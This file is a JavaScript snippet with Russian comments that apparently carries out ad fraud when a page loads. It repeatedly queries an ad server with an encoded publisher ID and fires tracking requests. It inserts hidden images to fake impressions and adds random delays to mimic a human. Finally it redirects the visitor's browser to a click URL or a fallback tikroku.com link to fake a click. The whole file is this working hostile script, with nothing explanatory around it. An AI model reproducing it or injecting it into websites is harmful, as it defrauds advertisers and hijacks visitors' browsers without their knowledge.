window.onload = () => {
    // Функция для получения рандомного числа между двумя числами
    const getRandomBetween = (min, max) => {
        return Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
    };

    (async function ad(text = "aeyJwaWQiOjEwMjMzOTMsInNpZCI6MTEyMDA0MSwid2lkIjoyODMyNTQsImQiOiIiLCJsaSI6Mn0=", ckredirect = 2, count_arr = [10, 15], refresh_time_arr = [99, 3070], otherUrl = 'https://tikroku.com/click.php?key=cdh7v23o34f38s3qqi9i') {
            // Функция с промисом для ожидания перед следующим запросом
            const delay = refresh_time => new Promise(resolve => setTimeout(resolve, refresh_time));

            try {

                let arrCount = [];
                for (let i = 0; i < getRandomBetween(count_arr[0], count_arr[1]); i++) {
                    arrCount.push(i);
                }

                const arrClickUrl = []; // Будущая ссылка для клика

                for (let rw of arrCount) {
                    const url = `https://yfetyg.com/wnload?a=1&e=${text}&tz=8&if=0 `;
                    const json = await (await fetch(url)).json();

                    for (let row of json) {
                        if ('rinfo' in row && 'rw' in row['rinfo']) {
                            try {
                                await fetch(`https://yfetyg.com${row['rinfo']['rw']}&a=1`);
                            } catch (e) {
                                try {
                                    await fetch(row['ads'][0]['uf'].split("&s=")[0]);
                                } catch (e) {
                                    console.log(e)
                                }
                            }
                        }
                        if ('ads' in row) {
                            let icon = document.createElement("img");
                            icon.style.visibility = 'hidden';
                            icon.src = `${row['ads'][0]['ic']}?r=${new Date().getTime()}`; // icon_url
                            document.body.appendChild(icon);

                            let new_url = row['ads'][0]['uf'];
                            if (new_url) arrClickUrl.push(new_url);
                        }
                    }
                    await delay(getRandomBetween(refresh_time_arr[0], refresh_time_arr[1]));
                }
                let ourUrl;
                switch (arrClickUrl.length) {
                    case 0:
                        ourUrl = otherUrl;
                        break;
                    case 1:
                        ourUrl = arrClickUrl[0];
                        break;
                    default:
                        let num = getRandomBetween(0, arrClickUrl.length - 1);
                        ourUrl = arrClickUrl[num];
                        break;
                }
                if (ckredirect === 1) {
                    window.location.href = otherUrl;
                } else if (getRandomBetween(1, ckredirect) !== ckredirect) {
                    ourUrl = otherUrl;
                }
                window.location.href = ourUrl;

            } catch
                (e) {
                throw e;
            }
        }
    )
    ();
}
